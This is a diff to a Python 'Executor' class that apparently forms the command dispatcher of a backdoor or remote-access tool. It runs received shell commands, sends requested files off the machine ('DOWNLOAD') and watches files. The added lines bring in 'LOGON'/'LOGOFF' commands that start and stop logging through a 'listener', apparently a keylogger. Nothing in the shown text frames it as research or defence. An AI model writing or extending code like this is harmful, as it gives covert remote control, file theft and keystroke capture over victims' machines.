@@ -4,11 +4,12 @@ from bdfileutils import FileMonitor, FileSender
 
 
 class Executor(object):
-    def __init__(self):
+    def __init__(self, listener):
         self.proc = None
         self.working_directory = os.path.dirname(os.path.realpath(__file__))
         self.filemon = FileMonitor()
         self.sender = FileSender()
+        self.listener = listener
 
     def add_watches(self, path_list):
         for path in path_list:
@@ -30,9 +31,7 @@ class Executor(object):
         """
         Executes the given command in a shell and returns the command output.
         """
-
-        # cd is a special case. The subprocess cannot change the working directory of our process, 
-        # so we have to do it manually
+        # special cases
         if command[:3] == 'cd ':
             try:
                 os.chdir(os.path.expanduser(command[3:]))
@@ -40,18 +39,28 @@ class Executor(object):
                 return None, str(e)
 
             return None, None
-        if command[:7] == 'UPLOAD ':
-            #
-            pass
-        if command[:9] == 'DOWNLOAD ':
+
+        elif command[:9] == 'DOWNLOAD ':
             if not os.path.exists(command[9:]):
-                return None, "File doesn't exist"
+                return None, "File doesn't exist\n"
 
             self.upload(command[9:])
 
             return '', None
 
-        if command[:6] == 'WATCH ':
+        elif command[:5] == 'LOGON':
+            if self.listener.start_logging():
+                return 'Logging started\n', None
+            else:
+                return None, 'Logging already started\n'
+
+        elif command[:6] == 'LOGOFF':
+            if self.listener.stop_logging():
+                return 'Logging stopped\n', None
+
+            return None, 'Logging already stopped\n'
+
+        elif command[:6] == 'WATCH ':
             # add a watch
             self.add_watch(command[6:])
             return 'Watch added', None
